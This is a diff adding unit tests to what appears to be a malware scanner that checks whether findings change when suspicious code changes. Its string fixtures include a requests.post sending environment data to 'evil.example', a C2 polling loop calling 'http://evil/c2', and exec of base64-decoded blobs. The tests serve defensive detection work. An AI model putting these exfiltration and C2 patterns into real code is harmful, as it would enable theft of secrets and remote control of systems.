@@ -539,6 +539,51 @@ def test_canon_evidence_strips_punctuation_label_marker():
     assert sp._evidence_hash(a) == sp._evidence_hash(b)
 
 
+def test_extract_evidence_binds_call_continuation_lines():
+    # A multi-line network call binds its argument lines, so a changed URL on a
+    # continuation line reopens even though the line with the API name is unchanged.
+    old = "requests.post(\n    'http://old.example',\n    data=env,\n)\n"
+    new = "requests.post(\n    'http://evil.example',\n    data=env,\n)\n"
+    eo = sp._extract_evidence(old, sp.RE_NETWORK)
+    en = sp._extract_evidence(new, sp.RE_NETWORK)
+    assert "old.example" in eo and "evil.example" in en
+    assert sp._evidence_hash(eo) != sp._evidence_hash(en)
+
+
+def test_extract_evidence_records_multiline_after_oneline():
+    # A one-line C2 match no longer suppresses a later multi-line C2 loop: the
+    # appended cross-line construct is recorded too, so it cannot ride the key.
+    oneline = "while True: time.sleep(60); requests.get('http://a/poll')\n"
+    appended = oneline + "while True:\n    time.sleep(30)\n    requests.get('http://evil/c2')\n"
+    eo = sp._extract_evidence(oneline, sp.RE_C2_POLLING)
+    ea = sp._extract_evidence(appended, sp.RE_C2_POLLING)
+    assert "evil" in ea
+    assert sp._evidence_hash(eo) != sp._evidence_hash(ea)
+
+
+def test_base64_exec_blob_finding_binds_every_blob():
+    # The base64+exec+blob finding digests every blob, so appending a second
+    # encoded payload reopens even when the first blob and decode line are unchanged.
+    head = "import base64\nblob1 = '" + "A" * 220 + "'\nexec(base64.b64decode(blob1))\n"
+    old = head
+    new = head + "blob2 = '" + "B" * 220 + "'\n"
+    fo = [f for f in sp.check_py_file(old, "p/x.py", "p") if "large encoded blob" in f.check]
+    fn = [f for f in sp.check_py_file(new, "p/x.py", "p") if "large encoded blob" in f.check]
+    assert fo and fn
+    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
+
+
+def test_pth_large_blob_finding_binds_every_blob():
+    # The .pth large-blob finding digests every blob, so appending a second
+    # encoded payload reopens rather than riding the unchanged first blob.
+    old = "import os\n" + "X" * 220 + "\n"
+    new = old + "Y" * 220 + "\n"
+    fo = [f for f in sp.check_pth_file(old, "p/x.pth", "p") if "large base64-like blob" in f.check]
+    fn = [f for f in sp.check_pth_file(new, "p/x.pth", "p") if "large base64-like blob" in f.check]
+    assert fo and fn
+    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
+
+
 def test_pth_unusually_large_finding_is_content_bound():
     # Two different payloads of equal size and import count must get different
     # keys: the finding now pins the .pth content via a digest.
